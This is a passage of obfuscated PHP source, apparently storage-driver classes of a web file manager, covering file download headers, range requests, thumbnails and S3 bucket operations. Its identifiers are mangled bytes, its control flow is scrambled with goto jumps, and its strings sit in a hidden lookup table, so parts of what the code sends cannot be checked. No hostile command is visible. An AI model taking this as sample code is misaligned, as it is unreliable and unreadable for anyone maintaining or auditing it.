C¬§Ûèó‘å; DŒËÃ†ƒÜÙ: $D†¹¥Å§Ìä =& $_SERVER[ã®Â„Éæ¹¤]; if (!function_exists($D†¹¥Å§Ìä[94])) { return !1; } $böåÈ—Ò™ = array($D†¹¥Å§Ìä[95], $D†¹¥Å§Ìä[96]); goto fÅ½¥¬Á™; C·ñçˆ·Éâ: } public function link($F©ƒ–Ôˆ·©) { return $F©ƒ–Ôˆ·©; } public function fileOut($Cå¹õÃùÙ, $a”º¢ÒÎÉ† = false, $Aê¤ÀİÂì× = false, $dô’Œë† = '') { goto C’«òØ®ˆç; bš–‰°³ó: if ($a¶ò™–ùçš) { $BĞ‡ñÏ®ß = intval(1000 * 1000 * ($eŠªé¼òè / $a¶ò™–ùçš)); } while ($d·æôƒ…ŠÀ <= $Fãé½¨¹òâ) { $EŒ¬ÒŞ¨¿– = timeFloat(); check_abort(); $a¡¨Ô±Ù² = $Fãé½¨¹òâ - $d·æôƒ…ŠÀ + 1; if ($a¡¨Ô±Ù² <= $eŠªé¼òè) { $eŠªé¼òè = $a¡¨Ô±Ù²; } echo $this->fileSubstr($Cå¹õÃùÙ, $d·æôƒ…ŠÀ, $eŠªé¼òè); $d·æôƒ…ŠÀ += $eŠªé¼òè; if ($eŠªé¼òè == $a¡¨Ô±Ù²) { $d·æôƒ…ŠÀ = $Fãé½¨¹òâ + 1; } if ($BĞ‡ñÏ®ß) { $e­‚ä¾¿Ø = intval(1000 * 1000 * (timeFloat() - $EŒ¬ÒŞ¨¿–)); $aèŒĞ¼´Ş“ = $BĞ‡ñÏ®ß - $e­‚ä¾¿Ø; if ($aèŒĞ¼´Ş“ > 5) { usleep($aèŒĞ¼´Ş“); } } } goto c°˜ÕïÑÀ£; D¿“İãååÌ: $F¨ÕŞ¬Ÿ©ˆ = rawurlencode($FÊ ¾àÔ¿); $F¨ÕŞ¬Ÿ©ˆ = $aÁŸµìî¤ä[113] . $F¨ÕŞ¬Ÿ©ˆ . $aÁŸµìî¤ä[117] . $F¨ÕŞ¬Ÿ©ˆ; if ($a”º¢ÒÎÉ†) { header($aÁŸµìî¤ä[118]); header($aÁŸµìî¤ä[119] . $F¨ÕŞ¬Ÿ©ˆ); } else { header($aÁŸµìî¤ä[120] . $F¨ÕŞ¬Ÿ©ˆ); } goto Dˆó®£¤åƒ; eÖ»õ…®ì: $føö•ì¬åæ = $eåñã¶«¦Ä[$aÁŸµìî¤ä[77]]; $d“À¹„±³ = gmdate($aÁŸµìî¤ä[106], $eåñã¶«¦Ä[$aÁŸµìî¤ä[107]]); $FÊ ¾àÔ¿ = $Aê¤ÀİÂì× ? $Aê¤ÀİÂì× : $this->iconvApp($eåñã¶«¦Ä[$aÁŸµìî¤ä[28]]); goto DƒÌ†‘÷íÁ; bÙñª¡Ä: $AóîÒ’×“· = !0; if ($_SERVER[$aÁŸµìî¤ä[151]] == $aÁŸµìî¤ä[152] && $føö•ì¬åæ > 1204 * 1024 * 1024 * 2) { $AóîÒ’×“· = !1; } if ($AóîÒ’×“·) { header($aÁŸµìî¤ä[153] . ($Fãé½¨¹òâ - $d·æôƒ…ŠÀ + 1)); } goto cÏóÎ–å˜; cÏóÎ–å˜: if ($_SERVER[$aÁŸµìî¤ä[154]] == $aÁŸµìî¤ä[155]) { return; } $eŠªé¼òè = 1024 * 100; $BĞ‡ñÏ®ß = 0; goto bš–‰°³ó; DƒÌ†‘÷íÁ: $d·æôƒ…ŠÀ = 0; $Fãé½¨¹òâ = $føö•ì¬åæ - 1; $c‡öê¡ÏÇµ = $this->ext($FÊ ¾àÔ¿); goto A¦½ÊÓÎ‡¶; EÎî˜İ¸öˆ: $c÷õ’àİ = get_file_mime($c‡öê¡ÏÇµ); if (strstr($c÷õ’àİ, $aÁŸµìî¤ä[114])) { $c÷õ’àİ = $c÷õ’àİ . $aÁŸµìî¤ä[115]; } if ($a”º¢ÒÎÉ† === !1 && !mime_support($c÷õ’àİ)) { $a”º¢ÒÎÉ† = !0; $c÷õ’àİ = $aÁŸµìî¤ä[116]; } goto D¿“İãååÌ; A¦½ÊÓÎ‡¶: if (in_array($c‡öê¡ÏÇµ, array($aÁŸµìî¤ä[108], $aÁŸµìî¤ä[109], $aÁŸµìî¤ä[110], $aÁŸµìî¤ä[111]))) { $c‡öê¡ÏÇµ = $aÁŸµìî¤ä[112]; } if (!$dô’Œë†) { $dô’Œë† = md5($d“À¹„±³ . $this->hashSimple($Cå¹õÃùÙ)); } $dô’Œë† = $aÁŸµìî¤ä[113] . $dô’Œë† . $aÁŸµìî¤ä[113]; goto EÎî˜İ¸öˆ; C’«òØ®ˆç: $aÁŸµìî¤ä =& $_SERVER[ã®Â„Éæ¹¤]; $this->cacheMethod(null, null); if (!$Cå¹õÃùÙ || !$this->exist($Cå¹õÃùÙ)) { show_json(LNG($aÁŸµìî¤ä[101]), !1, $Aê¤ÀİÂì×); } goto aÀ—ÇÎ££¢; Dˆó®£¤åƒ: header($aÁŸµìî¤ä[121]); header($aÁŸµìî¤ä[122] . $c÷õ’àİ); header($aÁŸµìî¤ä[123] . gmdate($aÁŸµìî¤ä[106], time() + 3600 * 24 * 30) . $aÁŸµìî¤ä[124]); goto d’ğò¨¨; d’ğò¨¨: header($aÁŸµìî¤ä[125]); header($aÁŸµìî¤ä[126]); header($aÁŸµìî¤ä[127]); goto aÍÌ¾ˆ¥‚; C¢¢ôÀ˜…è: @ob_end_clean(); set_timeout(); $eåñã¶«¦Ä = $this->infoFull($Cå¹õÃùÙ); goto eÖ»õ…®ì; c£œ¹°º—Ï: header($aÁŸµìî¤ä[132] . $d“À¹„±³ . $aÁŸµìî¤ä[124]); header($aÁŸµìî¤ä[133] . $FÊ ¾àÔ¿); header($aÁŸµìî¤ä[134]); goto E‘¨àÀ²¤; aÍÌ¾ˆ¥‚: if (isset($_SERVER[$aÁŸµìî¤ä[128]]) && strtotime($_SERVER[$aÁŸµìî¤ä[128]]) == $eåñã¶«¦Ä[$aÁŸµìî¤ä[107]]) { header($aÁŸµìî¤ä[129], !0, 304); die; } if (isset($_SERVER[$aÁŸµìî¤ä[130]]) && $_SERVER[$aÁŸµìî¤ä[130]] == $dô’Œë†) { header($aÁŸµìî¤ä[131] . $dô’Œë†, !0, 304); die; } header($aÁŸµìî¤ä[131] . $dô’Œë†); goto c£œ¹°º—Ï; AãŠ•è¦éç: $bôá“Ù±È» = strtolower($_SERVER[$aÁŸµìî¤ä[139]]); if ($fİÀ„˜ÆĞ && $bôá“Ù±È» && $d³ ‚Á˜‰ã) { if (strstr($bôá“Ù±È», $aÁŸµìî¤ä[140])) { header($aÁŸµìî¤ä[141] . $Cå¹õÃùÙ); } else { if (strstr($bôá“Ù±È», $aÁŸµìî¤ä[142])) { header($aÁŸµìî¤ä[143] . $Cå¹õÃùÙ); } else { if (strstr($bôá“Ù±È», $aÁŸµìî¤ä[144])) { header($aÁŸµìî¤ä[145] . $Cå¹õÃùÙ); } } } if ($a¶ò™–ùçš) { header($aÁŸµìî¤ä[146] . $a¶ò™–ùçš); } return; } if (isset($_SERVER[$aÁŸµìî¤ä[147]])) { if (preg_match($aÁŸµìî¤ä[148], $_SERVER[$aÁŸµìî¤ä[147]], $f ½×¢Åˆİ)) { $d·æôƒ…ŠÀ = intval($f ½×¢Åˆİ[1]); if (!empty($f ½×¢Åˆİ[2])) { $Fãé½¨¹òâ = intval($f ½×¢Åˆİ[2]); } } header($aÁŸµìî¤ä[149]); header("\x43\157\156\164\145\156\x74\55\x52\x61\x6e\x67\x65\72\x20\142\171\164\x65\163\40{$d·æôƒ…ŠÀ}\55{$Fãé½¨¹òâ}\x2f" . $føö•ì¬åæ); } else { header($aÁŸµìî¤ä[150]); } goto bÙñª¡Ä; aÀ—ÇÎ££¢: $fİÀ„˜ÆĞ = $this->getType() == $aÁŸµìî¤ä[102]; $d³ ‚Á˜‰ã = $GLOBALS[$aÁŸµìî¤ä[6]][$aÁŸµìî¤ä[84]][$aÁŸµìî¤ä[103]][$aÁŸµìî¤ä[104]]; $a¶ò™–ùçš = (double) $GLOBALS[$aÁŸµìî¤ä[6]][$aÁŸµìî¤ä[84]][$aÁŸµìî¤ä[103]][$aÁŸµìî¤ä[105]] * 1024 * 1024; goto C¢¢ôÀ˜…è; E‘¨àÀ²¤: header($aÁŸµìî¤ä[135] . $føö•ì¬åæ); header($aÁŸµìî¤ä[136]); if (!$a”º¢ÒÎÉ† && $c‡öê¡ÏÇµ == $aÁŸµìî¤ä[137]) { if ($føö•ì¬åæ > 1024 * 1024 * 5) { die; } $E÷Ê·À·© = $this->getContent($Cå¹õÃùÙ); $E÷Ê·À·© = Html::clearSVG($E÷Ê·À·©); header($aÁŸµìî¤ä[138] . $føö•ì¬åæ); echo $E÷Ê·À·©; die; } goto AãŠ•è¦éç; c°˜ÕïÑÀ£: } public function fileOutServer($f–ï‚ÍàÏÜ, $Cñ±Ô‰äøÄ = false, $bê—ëÊçõ = false, $Bìê·Ï¿Š¨ = '') { $this->fileOut($f–ï‚ÍàÏÜ, $Cñ±Ô‰äøÄ, $bê—ëÊçõ, $Bìê·Ï¿Š¨); } public function fileOutLink($añ¨°£âØÈ) { header($_SERVER[ã®Â„Éæ¹¤][156] . $añ¨°£âØÈ); die; } public function cacheMethod($b…Ó‚½·©ˆ, $FÁÓ˜ğ®¦) { goto a‘®™ÃÇò¬; e‡åëœ©ÎÅ: $FÏ‰ÅÙ³é = isset($a»£¥‹Á[$f¼‡ÌöÀ¥Ö]) ? $a»£¥‹Á[$f¼‡ÌöÀ¥Ö] : null; if (!is_null($FÏ‰ÅÙ³é)) { return $FÏ‰ÅÙ³é; } $FÏ‰ÅÙ³é = $this->{$b…Ó‚½·©ˆ}($FÁÓ˜ğ®¦); goto c²ÙÖŒŞİù; a‘®™ÃÇò¬: $eÕ¬Ñ«»µ =& $_SERVER[ã®Â„Éæ¹¤]; static $a»£¥‹Á = array(); $F¼õ¼»Ø… = $FÁÓ˜ğ®¦ ? ltrim($this->getPathOuter($FÁÓ˜ğ®¦), $eÕ¬Ñ«»µ[8]) : $FÁÓ˜ğ®¦; goto CÏ“ö„’“¶; CÏ“ö„’“¶: $f¼‡ÌöÀ¥Ö = $eÕ¬Ñ«»µ[157] . $b…Ó‚½·©ˆ . $eÕ¬Ñ«»µ[158] . rtrim($F¼õ¼»Ø…, $eÕ¬Ñ«»µ[8]); if (is_null($b…Ó‚½·©ˆ)) { $a»£¥‹Á = array(); return; } if (is_null($FÁÓ˜ğ®¦)) { unset($a»£¥‹Á[$f¼‡ÌöÀ¥Ö]); return; } goto e‡åëœ©ÎÅ; c²ÙÖŒŞİù: $a»£¥‹Á[$f¼‡ÌöÀ¥Ö] = $FÏ‰ÅÙ³é; return $FÏ‰ÅÙ³é; goto BŒ«†…åÇ; BŒ«†…åÇ: } public function fileOutImage($cƒÓ®²£å, $EŒ¬èŸˆİÙ = 250) { goto cÃÉ¾©šé; E¸¿—â±ëÍ: if (!($c–¾Ù²ÑÑ = IO::move($F³Ï™˜¼÷, $cŸµóÃÙ­))) { return IO::fileOut($F³Ï™˜¼÷); } del_file($F³Ï™˜¼÷); IO::fileOut($c–¾Ù²ÑÑ); goto dƒ…³øìå; f”¿… õ¬: if ($aöë“¿Œ«[$aŒš„Ì—ß¡[77]] <= 1024 * 50 || !function_exists($aŒš„Ì—ß¡[159]) || $aöë“¿Œ«[$aŒš„Ì—ß¡[160]] == $aŒš„Ì—ß¡[161]) { return $this->fileOut($cƒÓ®²£å); } if (isset($aöë“¿Œ«[$aŒš„Ì—ß¡[162]][$aŒš„Ì—ß¡[163]])) { $eó‚ÔË¶ø = $aöë“¿Œ«[$aŒš„Ì—ß¡[162]][$aŒš„Ì—ß¡[163]]; } else { if (isset($aöë“¿Œ«[$aŒš„Ì—ß¡[162]][$aŒš„Ì—ß¡[164]])) { $eó‚ÔË¶ø = $aöë“¿Œ«[$aŒš„Ì—ß¡[162]][$aŒš„Ì—ß¡[164]]; } else { $eó‚ÔË¶ø = md5("{$aöë“¿Œ«[$aŒš„Ì—ß¡[28]]}\137{$aöë“¿Œ«[$aŒš„Ì—ß¡[75]]}\x5f{$aöë“¿Œ«[$aŒš„Ì—ß¡[77]]}"); } } $a÷çŒë  = "{$eó‚ÔË¶ø}\x5f{$EŒ¬èŸˆİÙ}\56\160\x6e\147"; goto fàøÜ‰¦Š‘; fàøÜ‰¦Š‘: if (!($CšáŠ ÛŞ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $aŒš„Ì—ß¡[165]))) { $cŸµóÃÙ­ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $aŒš„Ì—ß¡[166]); } else { $cŸµóÃÙ­ = KodIO::make($CšáŠ ÛŞ); } if ($CšáŠ ÛŞ = IO::fileNameExist($cŸµóÃÙ­, $a÷çŒë )) { $F³Ï™˜¼÷ = KodIO::make($CšáŠ ÛŞ); return IO::fileOut($F³Ï™˜¼÷); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto c¯Ûó öèÔ; cÃÉ¾©šé: $aŒš„Ì—ß¡ =& $_SERVER[ã®Â„Éæ¹¤]; if (substr($cƒÓ®²£å, 0, 4) == $aŒš„Ì—ß¡[144]) { $this->fileOutLink($cƒÓ®²£å); } $aöë“¿Œ« = $this->info($cƒÓ®²£å); goto f”¿… õ¬; c¯Ûó öèÔ: $F³Ï™˜¼÷ = DATA_THUMB . $a÷çŒë ; if (!@file_exists($F³Ï™˜¼÷)) { $dÆŒùÏìí = TEMP_FILES; if (!is_dir($dÆŒùÏìí)) { mk_dir($dÆŒùÏìí); } $DËŠË²¡¼ñ = $dÆŒùÏìí . $eó‚ÔË¶ø . $aŒš„Ì—ß¡[91] . $aöë“¿Œ«[$aŒš„Ì—ß¡[160]]; if (!@file_exists($DËŠË²¡¼ñ)) { $DËŠË²¡¼ñ = $this->download($cƒÓ®²£å, $DËŠË²¡¼ñ); } $b×‹øì©ùˆ = new ImageThumb($DËŠË²¡¼ñ, $aŒš„Ì—ß¡[167]); $b×‹øì©ùˆ->prorate($F³Ï™˜¼÷, $EŒ¬èŸˆİÙ, $EŒ¬èŸˆİÙ * 10); } if (!file_exists($F³Ï™˜¼÷) || filesize($F³Ï™˜¼÷) < 100) { return @file_exists($DËŠË²¡¼ñ) ? IO::fileOut($DËŠË²¡¼ñ) : $this->fileOut($cƒÓ®²£å); } goto E¸¿—â±ëÍ; dƒ…³øìå: } public function fileOutImageServer($bØ¹ğÎ ÛŞ, $D£æö­ïĞ­ = 250) { $this->fileOutImage($bØ¹ğÎ ÛŞ, $D£æö­ïĞ­); } public function fileNameAuto($fğÒò½èˆ, $C´ğÎÃ‰‡º, $AİÆëÈ¥‰ğ = REPEAT_RENAME, $c¦ê™§ù…» = false) { goto bí×‰š³á”; fİ–òŸîõ˜: $BÏË¹¾„‡õ = 1; $B±£ËğÌáÇ = substr($C´ğÎÃ‰‡º, 0, strlen($C´ğÎÃ‰‡º) - strlen($c‹âÔ Õ)); $CË¾øæÄÅ = $B±£ËğÌáÇ . "\50{$BÏË¹¾„‡õ}\x29{$c‹âÔ Õ}"; goto e˜ÛµÑÆ¿Ò; e˜ÛµÑÆ¿Ò: while ($this->exist(rtrim($fğÒò½èˆ, $a‘±ÃçÓ© [8]) . $a‘±ÃçÓ© [8] . $CË¾øæÄÅ)) { $CË¾øæÄÅ = $B±£ËğÌáÇ . "\x28{$BÏË¹¾„‡õ}\51{$c‹âÔ Õ}"; $BÏË¹¾„‡õ++; } return $CË¾øæÄÅ; goto E¿¯îŒ„¬ ; F¯š¶ÎÏ: if ($AİÆëÈ¥‰ğ == REPEAT_SKIP) { return !1; } $c‹âÔ Õ = $a‘±ÃçÓ© [91] . get_path_ext($C´ğÎÃ‰‡º); $c‹âÔ Õ = $c‹âÔ Õ == $a‘±ÃçÓ© [91] || $c¦ê™§ù…» ? $a‘±ÃçÓ© [33] : $c‹âÔ Õ; goto fİ–òŸîõ˜; bí×‰š³á”: $a‘±ÃçÓ©  =& $_SERVER[ã®Â„Éæ¹¤]; $E½âò‚÷èº = $fğÒò½èˆ === $a‘±ÃçÓ© [33] ? $C´ğÎÃ‰‡º : rtrim($fğÒò½èˆ, $a‘±ÃçÓ© [8]) . $a‘±ÃçÓ© [8] . $C´ğÎÃ‰‡º; if ($AİÆëÈ¥‰ğ == REPEAT_REPLACE || !$this->exist($E½âò‚÷èº) || $c¦ê™§ù…» && $AİÆëÈ¥‰ğ != REPEAT_RENAME_FOLDER) { return $C´ğÎÃ‰‡º; } goto F¯š¶ÎÏ; E¿¯îŒ„¬ : } public function listAllFiles($F¶×¯óß“Ï, $E›õ•ÏÀÀ©, $Fİ¼–ÜßÉ = array()) { goto DµŒŞÇ²™—; c…ºÉ„ÔãŞ: foreach (array_unique($A±æÆğÖ‘¬) as $d´«÷»öß®) { $Fêãù”¶Œ = array($C—±”‚ê•š[75] => $this->getPathOuter($C—±”‚ê•š[8] . $F¶×¯óß“Ï . $C—±”‚ê•š[8] . $d´«÷»öß®), $C—±”‚ê•š[76] => 1, $C—±”‚ê•š[77] => 0); if (substr($d´«÷»öß®, -1) != $C—±”‚ê•š[8]) { $Fêãù”¶Œ[$C—±”‚ê•š[76]] = 0; $c½ŠÛ²ó’µ = $this->getPath($F¶×¯óß“Ï . $C—±”‚ê•š[8] . $d´«÷»öß®); $Fêãù”¶Œ[$C—±”‚ê•š[77]] = isset($Fİ¼–ÜßÉ[$c½ŠÛ²ó’µ]) ? $Fİ¼–ÜßÉ[$c½ŠÛ²ó’µ] : $this->size($c½ŠÛ²ó’µ); } $C‡Ö›ÂÓÂ[] = $Fêãù”¶Œ; } return $C‡Ö›ÂÓÂ; goto Cí§æãŠ¹¿; DµŒŞÇ²™—: $C—±”‚ê•š =& $_SERVER[ã®Â„Éæ¹¤]; if (empty($E›õ•ÏÀÀ©)) { return array(); } $A±æÆğÖ‘¬ = array(); goto C®ÊÂÈÄƒ; C®ÊÂÈÄƒ: $F¶×¯óß“Ï = trim($F¶×¯óß“Ï, $C—±”‚ê•š[8]); foreach ($E›õ•ÏÀÀ© as $d´«÷»öß®) { $CÇˆºèÛ¸ = ltrim(substr($d´«÷»öß®, strlen($F¶×¯óß“Ï)), $C—±”‚ê•š[8]); $A±æÆğÖ‘¬ = array_merge($A±æÆğÖ‘¬, $this->slicePath($CÇˆºèÛ¸)); } $C‡Ö›ÂÓÂ = array(); goto c…ºÉ„ÔãŞ; Cí§æãŠ¹¿: } public function slicePath($B ´¦ôŞ¥ø) { $bµé•‚œÙƒ =& $_SERVER[ã®Â„Éæ¹¤]; $FêÕñ¯–ƒÑ = explode($bµé•‚œÙƒ[8], trim($B ´¦ôŞ¥ø, $bµé•‚œÙƒ[8])); $FÁ¸ã°åœì = 0; do { ++$FÁ¸ã°åœì; $dÍ¯×±Œß¸[] = implode($bµé•‚œÙƒ[8], array_slice($FêÕñ¯–ƒÑ, 0, $FÁ¸ã°åœì)) . $bµé•‚œÙƒ[8]; } while ($FÁ¸ã°åœì < count($FêÕñ¯–ƒÑ)); $dÍ¯×±Œß¸[count($FêÕñ¯–ƒÑ) - 1] = $B ´¦ôŞ¥ø; return $dÍ¯×±Œß¸; } public function getHost() { $DŠ°™…ˆê =& $_SERVER[ã®Â„Éæ¹¤]; $eŒ…‰’È•¼ = parse_url(trim($this->domain, $DŠ°™…ˆê[8])); $d‰ïƒßŠ‚ñ = isset($eŒ…‰’È•¼[$DŠ°™…ˆê[168]]) ? $eŒ…‰’È•¼[$DŠ°™…ˆê[168]] : http_type(); $f Îêºƒµ¸ = isset($eŒ…‰’È•¼[$DŠ°™…ˆê[169]]) ? $eŒ…‰’È•¼[$DŠ°™…ˆê[169]] : $eŒ…‰’È•¼[$DŠ°™…ˆê[75]]; if (isset($eŒ…‰’È•¼[$DŠ°™…ˆê[170]])) { $f Îêºƒµ¸ .= $DŠ°™…ˆê[4] . $eŒ…‰’È•¼[$DŠ°™…ˆê[170]]; } return $d‰ïƒßŠ‚ñ . $DŠ°™…ˆê[171] . $f Îêºƒµ¸; } public function pathEncode($FêÆ¯½¥ÓÔ) { $FİğÔà¸œ³ =& $_SERVER[ã®Â„Éæ¹¤]; return str_replace($FİğÔà¸œ³[172], $FİğÔà¸œ³[8], rawurlencode($FêÆ¯½¥ÓÔ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($Aíğ²ôÌ) { set_timeout(); require_once SDK_DIR . $_SERVER[ã®Â„Éæ¹¤][173]; parent::__construct(); $this->_init($Aíğ²ôÌ); } public function _init($c¼†˜–”Îë) { foreach ($c¼†˜–”Îë as $E¾±±÷²µŒ => $C‘¾Ö”Äî) { if (isset($this->{$E¾±±÷²µŒ})) { $this->{$E¾±±÷²µŒ} = $C‘¾Ö”Äî; } } $this->endpoint = $c¼†˜–”Îë[$_SERVER[ã®Â„Éæ¹¤][174]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($fŞ‰Ñêª¤è = "\x76\64") { $this->signVer = $fŞ‰Ñêª¤è; $this->client->setSignatureVersion($fŞ‰Ñêª¤è); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto fÛŞ§˜Ôš; e’åÊˆİ´§: if ($cÛ Ü™Áï[$D”«¢ÙÏ•ƒ[175]] != $D”«¢ÙÏ•ƒ[176] || $cÛ Ü™Áï[$D”«¢ÙÏ•ƒ[177]] != $D”«¢ÙÏ•ƒ[176]) { return !1; } $CÍ’‹Ìä› = array_map($D”«¢ÙÏ•ƒ[178], $cÛ Ü™Áï[$D”«¢ÙÏ•ƒ[179]]); if (!is_array($CÍ’‹Ìä›)) { $CÍ’‹Ìä› = array(); } goto fİŒ›ÅßÙ; fİŒ›ÅßÙ: $eé‡˜ÑÍÜ¢ = array($D”«¢ÙÏ•ƒ[180], $D”«¢ÙÏ•ƒ[181], $D”«¢ÙÏ•ƒ[182], $D”«¢ÙÏ•ƒ[183], $D”«¢ÙÏ•ƒ[184]); $bƒˆ‚÷ãÌ™ = array_diff($eé‡˜ÑÍÜ¢, $CÍ’‹Ìä›); return empty($bƒˆ‚÷ãÌ™); goto D¼î‰óª™; fÛŞ§˜Ôš: $D”«¢ÙÏ•ƒ =& $_SERVER[ã®Â„Éæ¹¤]; $cÛ Ü™Áï = $this->getBucketCors(); if (!$cÛ Ü™Áï || !is_array($cÛ Ü™Áï)) { return !1; } goto e’åÊˆİ´§; D¼î‰óª™: } public function mkfile($B¹†Î¿ÜÒŠ, $B¥éÊëõù¹ = '', $f«•ÉÈË®ˆ = REPEAT_RENAME) { $DÜ¢Ô†ã·È = $this->setContent($B¹†Î¿ÜÒŠ, $B¥éÊëõù¹); if ($DÜ¢Ô†ã·È !== !1) { return $this->getPathOuter($B¹†Î¿ÜÒŠ); } return !1; } public function mkdir($côìë½´¸Å, $E®ÊÖÃ›’Ş = REPEAT_SKIP) { if (empty($côìë½´¸Å)) { return !1; } if ($this->_isFolder($côìë½´¸Å)) { return $this->getPathOuter($côìë½´¸Å); } $e‡”Àöã¥ = $this->setContent($côìë½´¸Å, $_SERVER[ã®Â„Éæ¹¤][33], !0); if ($e‡”Àöã¥ !== !1) { return $this->getPathOuter($côìë½´¸Å); } return !1; } public function copyFile($CØŸÜÍŠ—ó, $Eó®˜ƒœö™, $bØêÎ®ª¤Ì = array()) { $BÑÛÑÇ°ƒˆ =& $_SERVER[ã®Â„Éæ¹¤]; $d¼ÔŸç í“ = $this->objectMeta($CØŸÜÍŠ—ó); if (!$d¼ÔŸç í“) { return !1; } if ($d¼ÔŸç í“[$BÑÛÑÇ°ƒˆ[77]] <= 1024 * 1024 * 200) { $F’ö·½¢ñĞ = $this->client->copyObject($this->bucket, $CØŸÜÍŠ—ó, $this->bucket, $Eó®˜ƒœö™, $BÑÛÑÇ°ƒˆ[185], $bØêÎ®ª¤Ì); } else { $F’ö·½¢ñĞ = $this->client->multiCopyObject($this->bucket, $CØŸÜÍŠ—ó, $this->bucket, $Eó®˜ƒœö™, $bØêÎ®ª¤Ì); } $F’ö·½¢ñĞ = $F’ö·½¢ñĞ ? $this->getPathOuter($Eó®˜ƒœö™) : !1; return $F’ö·½¢ñĞ; } public function moveFile($eÆ´èè—, $fÈÄ¯¢îŠ) { if ($this->copyFile($eÆ´èè—, $fÈÄ¯¢îŠ)) { $this->delFile($eÆ´èè—); return $this->getPathOuter($fÈÄ¯¢îŠ); } return !1; } public function delFile($aÍî´ÅâÆ) { return $this->client->deleteObject($this->bucket, $aÍî´ÅâÆ); } public function delFolder($BÙÜ•ŒÔÄ) { goto BŠÔ’ï¿°é; aóŒ“©è‰“: return $c ŒÍ ÷è¦ === $C—÷ßˆ°˜ ? !0 : !1; goto CèôÚˆ±¢é; BŠÔ’ï¿°é: $BÈ¾ç÷®ä‘ =& $_SERVER[ã®Â„Éæ¹¤]; $e¹‚†ë¢Ùˆ = $this->listObjs($BÙÜ•ŒÔÄ); if (!$e¹‚†ë¢Ùˆ) { $BÙÜ•ŒÔÄ = trim($BÙÜ•ŒÔÄ, $BÈ¾ç÷®ä‘[8]); if (!empty($BÙÜ•ŒÔÄ)) { $BÙÜ•ŒÔÄ .= $BÈ¾ç÷®ä‘[8]; } return $this->delFile($BÙÜ•ŒÔÄ); } goto B±óÌ°Êõí; B±óÌ°Êõí: $c ŒÍ ÷è¦ = $C—÷ßˆ°˜ = 0; $FÁŞ²Î³™Ù = array_chunk(array_keys($e¹‚†ë¢Ùˆ), 1000); foreach ($FÁŞ²Î³™Ù as $EŒ²­Ÿ‹ªô) { $c ŒÍ ÷è¦++; $C—÷ßˆ°˜ += (int) $this->client->deleteObjects($this->bucket, $EŒ²­Ÿ‹ªô); } goto aóŒ“©è‰“; CèôÚˆ±¢é: } public function rename($d‡Œ†îğÆ´, $b§ØËÄ¿) { return $this->renameObject($d‡Œ†îğÆ´, $b§ØËÄ¿); } public function listPath($aã˜æĞ˜»Â, $DÊÓô¹¯ª = false) { $c“Æ¾¹¦Æ =& $_SERVER[ã®Â„Éæ¹¤]; $b³º‚ÌÂ = $this->listObjs($aã˜æĞ˜»Â, null, null, $c“Æ¾¹¦Æ[8]); $c»‡¤Éïª = array($c“Æ¾¹¦Æ[74] => array(), $c“Æ¾¹¦Æ[73] => array()); foreach ($b³º‚ÌÂ as $fÍÍ³âÎ => $CİÕì‰ºùè) { if ($fÍÍ³âÎ == $c“Æ¾¹¦Æ[8]) { continue; } if (isset($CİÕì‰ºùè[$c“Æ¾¹¦Æ[186]])) { $c»‡¤Éïª[$c“Æ¾¹¦Æ[74]][] = $this->folderInfo($CİÕì‰ºùè[$c“Æ¾¹¦Æ[186]], $DÊÓô¹¯ª); } else { if (substr($CİÕì‰ºùè[$c“Æ¾¹¦Æ[28]], -1) == $c“Æ¾¹¦Æ[8]) { continue; } $c»‡¤Éïª[$c“Æ¾¹¦Æ[73]][] = $this->fileInfo($CİÕì‰ºùè[$c“Æ¾¹¦Æ[28]], $DÊÓô¹¯ª, $CİÕì‰ºùè); } } return $c»‡¤Éïª; } private function fileInfo($eÊ‘…Å·›¤, $d½»‚ÙÃØõ = false, $dÄŞ÷ì³“™ = array()) { goto aæ‚ÅÆÄ‹÷; FøŠÌÅˆè†: if (empty($dÄŞ÷ì³“™)) { $dÄŞ÷ì³“™ = $this->objectMeta($eÊ‘…Å·›¤); if (!$dÄŞ÷ì³“™) { return $CÇ‡ïÛ«Î¬; } } if (isset($dÄŞ÷ì³“™[$aò…ĞÒèÕí[190]])) { $CÇ‡ïÛ«Î¬[$aò…ĞÒèÕí[107]] = $dÄŞ÷ì³“™[$aò…ĞÒèÕí[190]]; } if (isset($dÄŞ÷ì³“™[$aò…ĞÒèÕí[77]])) { $CÇ‡ïÛ«Î¬[$aò…ĞÒèÕí[77]] = $dÄŞ÷ì³“™[$aò…ĞÒèÕí[77]]; } goto E¥ŸÌ®Œµâ; E¥ŸÌ®Œµâ: return $CÇ‡ïÛ«Î¬; goto eæÛ¼‹í¢‘; aæ‚ÅÆÄ‹÷: $aò…ĞÒèÕí =& $_SERVER[ã®Â„Éæ¹¤]; if ($d½»‚ÙÃØõ) { return array($aò…ĞÒèÕí[28] => $this->pathThis($eÊ‘…Å·›¤), $aò…ĞÒèÕí[75] => $this->getPathOuter($eÊ‘…Å·›¤), $aò…ĞÒèÕí[29] => $aò…ĞÒèÕí[167], $aò…ĞÒèÕí[160] => $this->ext($eÊ‘…Å·›¤), $aò…ĞÒèÕí[77] => isset($dÄŞ÷ì³“™[$aò…ĞÒèÕí[77]]) ? $dÄŞ÷ì³“™[$aò…ĞÒèÕí[77]] : 0, $aò…ĞÒèÕí[187] => 0, $aò…ĞÒèÕí[107] => 0, $aò…ĞÒèÕí[188] => !0, $aò…ĞÒèÕí[189] => !0); } $CÇ‡ïÛ«Î¬ = array($aò…ĞÒèÕí[28] => $this->pathThis($eÊ‘…Å·›¤), $aò…ĞÒèÕí[75] => $this->getPathOuter($eÊ‘…Å·›¤), $aò…ĞÒèÕí[29] => $aò…ĞÒèÕí[167], $aò…ĞÒèÕí[187] => 0, $aò…ĞÒèÕí[107] => 0, $aò…ĞÒèÕí[77] => 0, $aò…ĞÒèÕí[160] => $this->ext($eÊ‘…Å·›¤), $aò…ĞÒèÕí[188] => !0, $aò…ĞÒèÕí[189] => !0); goto FøŠÌÅˆè†; 